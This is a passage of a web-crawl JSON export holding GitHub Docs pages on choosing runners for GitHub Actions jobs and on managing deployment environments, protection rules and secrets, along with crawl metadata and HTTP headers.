      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-connecting-to-a-private-network-using-an-api-gateway-with-oidc-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-connecting-to-a-private-network-using-an-api-gateway-with-oidc-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-connecting-to-a-private-network-using-an-api-gateway-with-oidc-readableTextIfPossibleHt"
    },
    "lengths": {
      "extractus": 2745,
      "readableText": 2775,
      "none": 22671,
      "readableTextIfPossible": 22671,
      "result": 2775,
      "markdown": 2239
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/writing-workflows/choosing-where-your-workflow-runs/choosing-the-runner-for-a-job",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/writing-workflows/choosing-where-your-workflow-runs/choosing-the-runner-for-a-job",
    "loadedTime": "2025-05-08T06:42:27.027Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/writing-workflows/choosing-where-your-workflow-runs/choosing-the-runner-for-a-job",
    "title": "Choosing the runner for a job - GitHub Docs",
    "description": "Define the type of machine that will process a job in your workflow.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Choosing the runner for a job - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/writing-workflows/choosing-where-your-workflow-runs/choosing-the-runner-for-a-job"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/writing-workflows/choosing-where-your-workflow-runs/choosing-the-runner-for-a-job"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "E869:1458C5:B9F01C:F44088:681C524C",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:42:21 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686541.974722, VS0, VE504",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "28924",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Choosing the runner for a job\nDefine the type of machine that will process a job in your workflow.\nOverview\nUse jobs.<job_id>.runs-on to define the type of machine to run the job on.\nThe destination machine can be either a GitHub-hosted runner, larger runner, or a self-hosted runner.\nYou can target runners based on the labels assigned to them, or their group membership, or a combination of these.\nYou can provide runs-on as:\nA single string\nA single variable containing a string\nAn array of strings, variables containing strings, or a combination of both\nA key: value pair using the group or labels keys\nIf you specify an array of strings or variables, your workflow will execute on any runner that matches all of the specified runs-on values. For example, here the job will only run on a self-hosted runner that has the labels linux, x64, and gpu:\nruns-on: [self-hosted, linux, x64, gpu] \nFor more information, see Choosing self-hosted runners.\nYou can mix strings and variables in an array. For example:\non: workflow_dispatch: inputs: chosen-os: required: true type: choice options: - Ubuntu - macOS jobs: test: runs-on: [self-hosted, \"${{ inputs.chosen-os }}\"] steps: - run: echo Hello world! \nIf you would like to run your workflow on multiple machines, use jobs.<job_id>.strategy.\nNote\nQuotation marks are not required around simple strings like self-hosted, but they are required for expressions like \"${{ inputs.chosen-os }}\".\nChoosing GitHub-hosted runners\nIf you use a GitHub-hosted runner, each job runs in a fresh instance of a runner image specified by runs-on.\nThe value for runs-on, when you are using a GitHub-hosted runner, is a runner label or the name of a runner group. The labels for the standard GitHub-hosted runners are shown in the following tables.\nFor more information, see About GitHub-hosted runners.\nStandard GitHub-hosted runners for public repositories\nFor public repositories, jobs using the workflow labels shown in the table below will run on virtual machines with the associated specifications. The use of these runners on public repositories is free and unlimited.\nVirtual Machine Processor (CPU) Memory (RAM) Storage (SSD) Architecture Workflow label \nLinux\t4\t16 GB\t14 GB\tx64 \tubuntu-latest, ubuntu-24.04, ubuntu-22.04 \t\nWindows\t4\t16 GB\t14 GB\tx64 \twindows-latest, windows-2025, windows-2022, windows-2019 \t\nLinux [Public preview]\t4\t16 GB\t14 GB\tarm64 \tubuntu-24.04-arm, ubuntu-22.04-arm \t\nWindows [Public preview]\t4\t16 GB\t14 GB\tarm64\twindows-11-arm \t\nmacOS\t4\t14 GB\t14 GB\tIntel \tmacos-13 \t\nmacOS\t3 (M1)\t7 GB\t14 GB\tarm64 \tmacos-latest, macos-14, macos-15 \t\nNote\nThe arm64 Linux and Windows runners are in public preview and subject to change.\nStandard GitHub-hosted runners for private repositories\nFor private repositories, jobs using the workflow labels shown in the table below will run on virtual machines with the associated specifications. These runners use your GitHub account's allotment of free minutes, and are then charged at the per minute rates. For more information, see About billing for GitHub Actions.\nVirtual Machine Processor (CPU) Memory (RAM) Storage (SSD) Architecture Workflow label \nLinux\t2\t7 GB\t14 GB\tx64 \tubuntu-latest, ubuntu-24.04, ubuntu-22.04 \t\nWindows\t2\t7 GB\t14 GB\tx64 \twindows-latest, windows-2025, windows-2022, windows-2019 \t\nmacOS\t4\t14 GB\t14 GB\tIntel \tmacos-13 \t\nmacOS\t3 (M1)\t7 GB\t14 GB\tarm64 \tmacos-latest, macos-14, macos-15 \t\nIn addition to the standard GitHub-hosted runners, GitHub offers customers on GitHub Team and GitHub Enterprise Cloud plans a range of managed virtual machines with advanced features - for example, more cores and disk space, GPU-powered machines, and ARM-powered machines. For more information, see About larger runners.\nNote\nThe -latest runner images are the latest stable images that GitHub provides, and might not be the most recent version of the operating system available from the operating system vendor.\nWarning\nBeta and Deprecated Images are provided \"as-is\", \"with all faults\" and \"as available\" and are excluded from the service level agreement and warranty. Beta Images may not be covered by customer support.\nExample: Specifying an operating system\nruns-on: ubuntu-latest \nFor more information, see Using GitHub-hosted runners.\nChoosing self-hosted runners\nTo specify a self-hosted runner for your job, configure runs-on in your workflow file with self-hosted runner labels.\nSelf-hosted runners may have the self-hosted label. When setting up a self-hosted runner, by default we will include the label self-hosted. You may pass in the --no-default-labels flag to prevent the self-hosted label from being applied. Labels can be used to create targeting options for runners, such as operating system or architecture, we recommend providing an array of labels that begins with self-hosted (this must be listed first) and then includes additional labels as needed. When you specify an array of labels, jobs will be queued on runners that have all the labels that you specify.\nNote that Actions Runner Controller does not support multiple labels and does not support the self-hosted label.\nExample: Using labels for runner selection\nruns-on: [self-hosted, linux] \nFor more information, see About self-hosted runners and Using self-hosted runners in a workflow.\nChoosing runners in a group\nYou can use runs-on to target runner groups, so that the job will execute on any runner that is a member of that group. For more granular control, you can also combine runner groups with labels.\nRunner groups can only have larger runners or self-hosted runners as members.\nExample: Using groups to control where jobs are run\nIn this example, Ubuntu runners have been added to a group called ubuntu-runners. The runs-on key sends the job to any available runner in the ubuntu-runners group:\nname: learn-github-actions on: [push] jobs: check-bats-version: runs-on: group: ubuntu-runners steps: - uses: actions/checkout@v4 - uses: actions/setup-node@v4 with: node-version: '14' - run: npm install -g bats - run: bats -v \nExample: Combining groups and labels\nWhen you combine groups and labels, the runner must meet both requirements to be eligible to run the job.\nIn this example, a runner group called ubuntu-runners is populated with Ubuntu runners, which have also been assigned the label ubuntu-20.04-16core. The runs-on key combines group and labels so that the job is routed to any available runner within the group that also has a matching label:\nname: learn-github-actions on: [push] jobs: check-bats-version: runs-on: group: ubuntu-runners labels: ubuntu-20.04-16core steps: - uses: actions/checkout@v4 - uses: actions/setup-node@v4 with: node-version: '14' - run: npm install -g bats - run: bats -v",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-where-your-workflow-runs-choosing-the-runner-for-a-job-xum8i.html",
  "markdown": "# Choosing the runner for a job\n\nDefine the type of machine that will process a job in your workflow.\n\n## [Overview](#overview)\n\nUse `jobs.<job_id>.runs-on` to define the type of machine to run the job on.\n\n*   The destination machine can be either a [GitHub-hosted runner](#choosing-github-hosted-runners), [larger runner](#choosing-runners-in-a-group), or a [self-hosted runner](#choosing-self-hosted-runners).\n\n*   You can target runners based on the labels assigned to them, or their group membership, or a combination of these.\n    \n*   You can provide `runs-on` as:\n    \n    *   A single string\n    *   A single variable containing a string\n    *   An array of strings, variables containing strings, or a combination of both\n    *   A `key: value` pair using the `group` or `labels` keys\n*   If you specify an array of strings or variables, your workflow will execute on any runner that matches all of the specified `runs-on` values. For example, here the job will only run on a self-hosted runner that has the labels `linux`, `x64`, and `gpu`:\n    \n    ```\n    runs-on: [self-hosted, linux, x64, gpu]\n    ```\n    \n    For more information, see [Choosing self-hosted runners](#choosing-self-hosted-runners).\n    \n*   You can mix strings and variables in an array. For example:\n    \n    ```\n    on:\n      workflow_dispatch:\n        inputs:\n          chosen-os:\n            required: true\n            type: choice\n            options:\n            - Ubuntu\n            - macOS\n    \n    jobs:\n      test:\n        runs-on: [self-hosted, \"${{ inputs.chosen-os }}\"]\n        steps:\n        - run: echo Hello world!\n    ```\n    \n*   If you would like to run your workflow on multiple machines, use [`jobs.<job_id>.strategy`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstrategy).\n    \n\nNote\n\nQuotation marks are not required around simple strings like `self-hosted`, but they are required for expressions like `\"${{ inputs.chosen-os }}\"`.\n\n## [Choosing GitHub-hosted runners](#choosing-github-hosted-runners)\n\nIf you use a GitHub-hosted runner, each job runs in a fresh instance of a runner image specified by `runs-on`.\n\nThe value for runs-on, when you are using a GitHub-hosted runner, is a runner label or the name of a runner group. The labels for the standard GitHub-hosted runners are shown in the following tables.\n\nFor more information, see [About GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners/about-github-hosted-runners).\n\n### [Standard GitHub-hosted runners for public repositories](#standard-github-hosted-runners-for-public-repositories)\n\nFor public repositories, jobs using the workflow labels shown in the table below will run on virtual machines with the associated specifications. The use of these runners on public repositories is free and unlimited.\n\n| **Virtual Machine** | **Processor (CPU)** | **Memory (RAM)** | **Storage (SSD)** | **Architecture** | **Workflow label** |\n| --- | --- | --- | --- | --- | --- |\n| Linux | 4   | 16 GB | 14 GB | x64 | `[ubuntu-latest](https://github.com/actions/runner-images/blob/main/images/ubuntu/Ubuntu2404-Readme.md)`, `[ubuntu-24.04](https://github.com/actions/runner-images/blob/main/images/ubuntu/Ubuntu2404-Readme.md)`, `[ubuntu-22.04](https://github.com/actions/runner-images/blob/main/images/ubuntu/Ubuntu2204-Readme.md)` |\n| Windows | 4   | 16 GB | 14 GB | x64 | `[windows-latest](https://github.com/actions/runner-images/blob/main/images/windows/Windows2022-Readme.md)`, `[windows-2025](https://github.com/actions/runner-images/blob/main/images/windows/Windows2025-Readme.md)`, `[windows-2022](https://github.com/actions/runner-images/blob/main/images/windows/Windows2022-Readme.md)`, `[windows-2019](https://github.com/actions/runner-images/blob/main/images/windows/Windows2019-Readme.md)` |\n| Linux \\[Public preview\\] | 4   | 16 GB | 14 GB | arm64 | `[ubuntu-24.04-arm](https://github.com/actions/partner-runner-images/blob/main/images/arm-ubuntu-24-image.md)`, `[ubuntu-22.04-arm](https://github.com/actions/partner-runner-images/blob/main/images/arm-ubuntu-22-image.md)` |\n| Windows \\[Public preview\\] | 4   | 16 GB | 14 GB | arm64 | `[windows-11-arm](https://github.com/actions/partner-runner-images/blob/main/images/arm-windows-11-image.md)` |\n| macOS | 4   | 14 GB | 14 GB | Intel | `[macos-13](https://github.com/actions/runner-images/blob/main/images/macos/macos-13-Readme.md)` |\n| macOS | 3 (M1) | 7 GB | 14 GB | arm64 | `[macos-latest](https://github.com/actions/runner-images/blob/main/images/macos/macos-14-Readme.md)`, `[macos-14](https://github.com/actions/runner-images/blob/main/images/macos/macos-14-Readme.md)`, `[macos-15](https://github.com/actions/runner-images/blob/main/images/macos/macos-15-Readme.md)` |\n\nNote\n\nThe arm64 Linux and Windows runners are in public preview and subject to change.\n\n### [Standard GitHub-hosted runners for private repositories](#standard-github-hosted-runners-for--private-repositories)\n\nFor private repositories, jobs using the workflow labels shown in the table below will run on virtual machines with the associated specifications. These runners use your GitHub account's allotment of free minutes, and are then charged at the per minute rates. For more information, see [About billing for GitHub Actions](https://docs.github.com/en/billing/managing-billing-for-github-actions/about-billing-for-github-actions#per-minute-rates).\n\n| **Virtual Machine** | **Processor (CPU)** | **Memory (RAM)** | **Storage (SSD)** | **Architecture** | **Workflow label** |\n| --- | --- | --- | --- | --- | --- |\n| Linux | 2   | 7 GB | 14 GB | x64 | `[ubuntu-latest](https://github.com/actions/runner-images/blob/main/images/ubuntu/Ubuntu2404-Readme.md)`, `[ubuntu-24.04](https://github.com/actions/runner-images/blob/main/images/ubuntu/Ubuntu2404-Readme.md)`, `[ubuntu-22.04](https://github.com/actions/runner-images/blob/main/images/ubuntu/Ubuntu2204-Readme.md)` |\n| Windows | 2   | 7 GB | 14 GB | x64 | `[windows-latest](https://github.com/actions/runner-images/blob/main/images/windows/Windows2022-Readme.md)`, `[windows-2025](https://github.com/actions/runner-images/blob/main/images/windows/Windows2025-Readme.md)`, `[windows-2022](https://github.com/actions/runner-images/blob/main/images/windows/Windows2022-Readme.md)`, `[windows-2019](https://github.com/actions/runner-images/blob/main/images/windows/Windows2019-Readme.md)` |\n| macOS | 4   | 14 GB | 14 GB | Intel | `[macos-13](https://github.com/actions/runner-images/blob/main/images/macos/macos-13-Readme.md)` |\n| macOS | 3 (M1) | 7 GB | 14 GB | arm64 | `[macos-latest](https://github.com/actions/runner-images/blob/main/images/macos/macos-14-Readme.md)`, `[macos-14](https://github.com/actions/runner-images/blob/main/images/macos/macos-14-Readme.md)`, `[macos-15](https://github.com/actions/runner-images/blob/main/images/macos/macos-15-Readme.md)` |\n\nIn addition to the standard GitHub-hosted runners, GitHub offers customers on GitHub Team and GitHub Enterprise Cloud plans a range of managed virtual machines with advanced features - for example, more cores and disk space, GPU-powered machines, and ARM-powered machines. For more information, see [About larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-larger-runners/about-larger-runners).\n\nNote\n\nThe `-latest` runner images are the latest stable images that GitHub provides, and might not be the most recent version of the operating system available from the operating system vendor.\n\nWarning\n\nBeta and Deprecated Images are provided \"as-is\", \"with all faults\" and \"as available\" and are excluded from the service level agreement and warranty. Beta Images may not be covered by customer support.\n\n#### [Example: Specifying an operating system](#example-specifying-an-operating-system)\n\n```\nruns-on: ubuntu-latest\n```\n\nFor more information, see [Using GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners).\n\n## [Choosing self-hosted runners](#choosing-self-hosted-runners)\n\nTo specify a self-hosted runner for your job, configure `runs-on` in your workflow file with self-hosted runner labels.\n\nSelf-hosted runners may have the `self-hosted` label. When setting up a self-hosted runner, by default we will include the label `self-hosted`. You may pass in the `--no-default-labels` flag to prevent the self-hosted label from being applied. Labels can be used to create targeting options for runners, such as operating system or architecture, we recommend providing an array of labels that begins with `self-hosted` (this must be listed first) and then includes additional labels as needed. When you specify an array of labels, jobs will be queued on runners that have all the labels that you specify.\n\nNote that Actions Runner Controller does not support multiple labels and does not support the `self-hosted` label.\n\n#### [Example: Using labels for runner selection](#example-using-labels-for-runner-selection)\n\n```\nruns-on: [self-hosted, linux]\n```\n\nFor more information, see [About self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners) and [Using self-hosted runners in a workflow](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/using-self-hosted-runners-in-a-workflow).\n\n## [Choosing runners in a group](#choosing-runners-in-a-group)\n\nYou can use `runs-on` to target runner groups, so that the job will execute on any runner that is a member of that group. For more granular control, you can also combine runner groups with labels.\n\nRunner groups can only have [larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners) or [self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners) as members.\n\n#### [Example: Using groups to control where jobs are run](#example-using-groups-to-control-where-jobs-are-run)\n\nIn this example, Ubuntu runners have been added to a group called `ubuntu-runners`. The `runs-on` key sends the job to any available runner in the `ubuntu-runners` group:\n\n```\nname: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on: \n      group: ubuntu-runners\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v\n```\n\n#### [Example: Combining groups and labels](#example-combining-groups-and-labels)\n\nWhen you combine groups and labels, the runner must meet both requirements to be eligible to run the job.\n\nIn this example, a runner group called `ubuntu-runners` is populated with Ubuntu runners, which have also been assigned the label `ubuntu-20.04-16core`. The `runs-on` key combines `group` and `labels` so that the job is routed to any available runner within the group that also has a matching label:\n\n```\nname: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on:\n      group: ubuntu-runners\n      labels: ubuntu-20.04-16core\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 279,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-where-your-workflow-runs-choosing-the-runner-for-a-job-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-where-your-workflow-runs-choosing-the-runner-for-a-job-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-where-your-workflow-runs-choosing-the-runner-for-a-job-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-where-your-workflow-runs-choosing-the-runner-for-a-job-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-where-your-workflow-runs-choosing-the-runner-for-a-job-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 18357,
      "readableText": 16466,
      "none": 39161,
      "readableTextIfPossible": 16466,
      "result": 16466,
      "markdown": 11345
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment",
    "loadedTime": "2025-05-08T06:42:30.724Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment",
    "title": "Managing environments for deployment - GitHub Docs",
    "description": "You can create environments and secure those environments with deployment protection rules. A job that references an environment must follow any protection rules for the environment before running or accessing the environment's secrets.",
    "author": null,
    "keywords": "CD,Deployment",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Managing environments for deployment - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "2F07:119C4F:B2415A:EC9E21:681C524D",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:42:22 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686542.981828, VS0, VE365",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "32728",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Managing environments for deployment - GitHub Docs\nYou can create environments and secure those environments with deployment protection rules. A job that references an environment must follow any protection rules for the environment before running or accessing the environment's secrets.\nWho can use this feature?\nEnvironments, environment secrets, and deployment protection rules are available in public repositories for all current GitHub plans. They are not available on legacy plans, such as Bronze, Silver, or Gold. For access to environments, environment secrets, and deployment branches in private or internal repositories, you must use GitHub Pro, GitHub Team, or GitHub Enterprise. If you are on a GitHub Free, GitHub Pro, or GitHub Team plan, other deployment protection rules, such as a wait timer or required reviewers, are only available for public repositories.\nAbout environments\nEnvironments are used to describe a general deployment target like production, staging, or development. When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. For more information about viewing deployments to environments, see Viewing deployment history.\nYou can configure environments with protection rules and secrets. When a workflow job references an environment, the job won't start until all of the environment's protection rules pass. A job also cannot access secrets that are defined in an environment until all the deployment protection rules pass.\nOptionally, you can bypass an environment's protection rules and force all pending jobs referencing the environment to proceed. For more information, see Reviewing deployments.\nNote\nUsers with GitHub Free plans can only configure environments for public repositories. If you convert a repository from public to private, any configured protection rules or environment secrets will be ignored, and you will not be able to configure any environments. If you convert your repository back to public, you will have access to any previously configured protection rules and environment secrets.\nOrganizations with GitHub Team and users with GitHub Pro can configure environments for private repositories. For more information, see GitHub’s plans.\nDeployment protection rules\nDeployment protection rules require specific conditions to pass before a job referencing the environment can proceed. You can use deployment protection rules to require a manual approval, delay a job, or restrict the environment to certain branches. You can also create and implement custom protection rules powered by GitHub Apps to use third-party systems to control deployments referencing environments configured on GitHub.\nThird-party systems can be observability systems, change management systems, code quality systems, or other manual configurations that you use to assess readiness before deployments are safely rolled out to environments.\nNote\nAny number of GitHub Apps-based deployment protection rules can be installed on a repository. However, a maximum of 6 deployment protection rules can be enabled on any environment at the same time.\nRequired reviewers\nUse required reviewers to require a specific person or team to approve workflow jobs that reference the environment. You can list up to six users or teams as reviewers. The reviewers must have at least read access to the repository. Only one of the required reviewers needs to approve the job for it to proceed.\nYou also have the option to prevent self-reviews for deployments to protected environments. If you enable this setting, users who initiate a deployment cannot approve the deployment job, even if they are a required reviewer. This ensures that deployments to protected environments are always reviewed by more than one person.\nFor more information on reviewing jobs that reference an environment with required reviewers, see Reviewing deployments.\nNote\nIf you are on a GitHub Free, GitHub Pro, or GitHub Team plan, required reviewers are only available for public repositories.\nWait timer\nUse a wait timer to delay a job for a specific amount of time after the job is initially triggered. The time (in minutes) must be an integer between 1 and 43,200 (30 days). Wait time will not count towards your billable time.\nNote\nIf you are on a GitHub Free, GitHub Pro, or GitHub Team plan, wait timers are only available for public repositories.\nDeployment branches and tags\nUse deployment branches and tags to restrict which branches and tags can deploy to the environment. Below are the options for deployment branches and tags for an environment:\nNo restriction: No restriction on which branch or tag can deploy to the environment.\nProtected branches only: Only branches with branch protection rules enabled can deploy to the environment. If no branch protection rules are defined for any branch in the repository, then all branches can deploy. For more information about branch protection rules, see About protected branches.\nNote\nDeployment workflow runs triggered by tags with the same name as a protected branch and forks with branches that match the protected branch name cannot deploy to the environment.\nSelected branches and tags: Only branches and tags that match your specified name patterns can deploy to the environment.\nIf you specify releases/* as a deployment branch or tag rule, only a branch or tag whose name begins with releases/ can deploy to the environment. (Wildcard characters will not match /. To match branches or tags that begin with release/ and contain an additional single slash, use release/*/*.) If you add main as a branch rule, a branch named main can also deploy to the environment. For more information about syntax options for deployment branches, see the Ruby File.fnmatch documentation.\nNote\nName patterns must be configured for branches or tags individually.\nNote\nDeployment branches and tags are available for all public repositories. For users on GitHub Pro or GitHub Team plans, deployment branches and tags are also available for private repositories.\nAllow administrators to bypass configured protection rules\nBy default, administrators can bypass the protection rules and force deployments to specific environments. For more information, see Reviewing deployments.\nAlternatively, you can configure environments to disallow bypassing the protection rules for all deployments to the environment.\nNote\nAllowing administrators to bypass protection rules is only available for public repositories for users on GitHub Free, GitHub Pro, and GitHub Team plans.\nCustom deployment protection rules\nNote\nCustom deployment protection rules are currently in public preview and subject to change.\nYou can enable your own custom protection rules to gate deployments with third-party services. For example, you can use services such as Datadog, Honeycomb, and ServiceNow to provide automated approvals for deployments to GitHub. For more information, see Creating custom deployment protection rules.\nOnce custom deployment protection rules have been created and installed on a repository, you can enable the custom deployment protection rule for any environment in the repository. For more information about configuring and enabling custom deployment protection rules, see Configuring custom deployment protection rules.\nNote\nCustom deployment protection rules are only available for public repositories for users on GitHub Free, GitHub Pro, and GitHub Team plans.\nEnvironment secrets\nSecrets stored in an environment are only available to workflow jobs that reference the environment. If the environment requires approval, a job cannot access environment secrets until one of the required reviewers approves it. For more information about secrets, see About secrets.\nNote\nWorkflows that run on self-hosted runners are not run in an isolated container, even if they use environments. Environment secrets should be treated with the same level of security as repository and organization secrets. For more information, see Security hardening for GitHub Actions.\nIf you are using GitHub Free, environment secrets are only available in public repositories. For access to environment secrets in private or internal repositories, you must use GitHub Pro, GitHub Team, or GitHub Enterprise. For more information on switching your plan, see Upgrading your account's plan.\nEnvironment variables\nVariables stored in an environment are only available to workflow jobs that reference the environment. These variables are only accessible using the vars context. For more information, see Store information in variables.\nNote\nEnvironment variables are available for all public repositories. For users on GitHub Pro or GitHub Team plans, environment variables are also available for private repositories.\nCreating an environment\nTo configure an environment in a personal account repository, you must be the repository owner. To configure an environment in an organization repository, you must have admin access.\nNote\nCreation of an environment in a private repository is available to organizations with GitHub Team and users with GitHub Pro.\nSome features for environments have no or limited availability for private repositories. If you are unable to access a feature described in the instructions below, please see the documentation linked in the related step for availability information.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Settings. If you cannot see the \"Settings\" tab, select the dropdown menu, then click Settings.\nIn the left sidebar, click Environments.\nClick New environment.\nEnter a name for the environment, then click Configure environment. Environment names are not case sensitive. An environment name may not exceed 255 characters and must be unique within the repository.\nOptionally, specify people or teams that must approve workflow jobs that use this environment. For more information, see Required reviewers.\nSelect Required reviewers.\nEnter up to 6 people or teams. Only one of the required reviewers needs to approve the job for it to proceed.\nOptionally, to prevent users from approving workflows runs that they triggered, select Prevent self-review.\nClick Save protection rules.\nOptionally, specify the amount of time to wait before allowing workflow jobs that use this environment to proceed. For more information, see Wait 